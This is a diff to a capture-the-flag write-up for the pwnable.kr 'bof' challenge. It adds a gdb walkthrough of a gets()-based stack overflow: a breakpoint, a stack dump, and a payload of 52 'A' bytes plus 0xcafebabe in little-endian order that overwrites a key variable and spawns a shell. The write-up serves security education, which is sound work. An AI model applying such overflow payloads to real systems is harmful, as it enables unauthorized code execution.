@@ -11,10 +11,10 @@ Running at : nc pwnable.kr 9000
 
 ## Solution
 
-in this challenge we should provide the value **0xcafebabe** for **key** variable to spawn a shell, but this variable is not normally in our control.
+In this challenge we should provide the value **0xcafebabe** for **key** variable to spawn a shell, but this variable is not normally in our control.
 when we look at the **fucn()** code we see the **gets()** function is used as input function for **overflowme** variable and this is where we should smash the stack :)
 
-i open the program with **gdb** debugger and disassemble the **func()** function.
+I open the program with **gdb** debugger and disassemble the **func()** function.
 
 ```
 (gdb) disass func
@@ -45,4 +45,31 @@ Dump of assembler code for function func:
    0x56555689 <+93>:    ret    
 End of assembler dump.
 ```
-We can see 
+We set a memory breakpoint on the comparison instruction line.
+```
+(gdb) break *0x56555654
+ Breakpoint 1 at 0x56555654
+```
+We run the program again with **"AAAA"** as input.
+```
+(gdb) r                                     
+Starting program: /path/of/program
+overflow me :                               
+AAAA        
+
+Breakpoint 1, 0x56555654 in func ()
+```
+We can see the stack with the following command.
+```
+(gdb) x/22xw $esp
+0xffffd0f0:     0xffffd10c      0xffffd1f4      0xf7fac000      0xf7faaa80
+0xffffd100:     0x00000000      0xf7fac000      0xf7ffc800      0x41414141
+0xffffd110:     0x56556f00      0xf7fac000      0x00000001      0x5655549d
+0xffffd120:     0xf7fac3fc      0x00040000      0x56556ff4      0xb82ae100
+0xffffd130:     0x56556ff4      0xf7fac000      0xffffd158      0x5655569f
+0xffffd140:     0xdeadbeef      0x00000000
+```
+we know the **func()** is initialized with 0xdeadbeef value and it's the current value of the **key** variable. we also know the value of **overflowme** variable (0x41414141). so when we calculate how many A (0x41) characters we should enter to override the **key** variable and write **0xcafebabe** into its address. 
+so when we calculate the space between the **overflowme** variable and **key** variable we find that we need to enter 52 bytes (character) to start overriding the **key** variable. the payload to solve the challenge is **A&ast;52+0xcafebabe** but we type 0xcafebabe in reverse order because the system is little endian.
+
+run the python code to get the flag. :)
